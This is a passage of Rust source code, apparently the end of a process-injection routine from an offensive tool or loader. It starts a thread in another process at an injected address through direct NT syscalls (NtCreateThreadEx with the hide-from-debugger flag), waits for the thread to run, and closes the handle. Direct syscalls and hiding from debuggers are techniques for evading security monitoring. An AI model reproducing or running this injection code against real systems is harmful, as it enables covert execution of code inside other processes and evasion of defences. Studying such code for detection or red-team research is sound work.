    unsafe {
        status = syscall!(
            "NtCreateThreadEx",
            &mut thread_handle,
            THREAD_ALL_ACCESS,
            NULL,
            process_handle,
            base_addr,
            NULL,
            THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
            0 as usize,
            0 as usize,
            0 as usize,
            NULL
        );
    }
    if !NT_SUCCESS(status) {
        log::debug!("Error starting remote thread: {:x}", status);
        return Err(status.to_string().into());
    }

    unsafe {
        status = syscall!(
            "NtWaitForSingleObject",
            thread_handle,
            0,
            NULL as *mut _ as *mut LARGE_INTEGER
        );
        if !NT_SUCCESS(status) {
            log::debug!("Error waiting for execution: {:x}", status);
            return Err(status.to_string().into());
        }
    }

    unsafe {
        status = syscall!("NtClose", process_handle);
    }
    if !NT_SUCCESS(status) {
        log::debug!("Closing failed: {}", status);
        return Err(status.to_string().into());
    }

    Ok(())
}
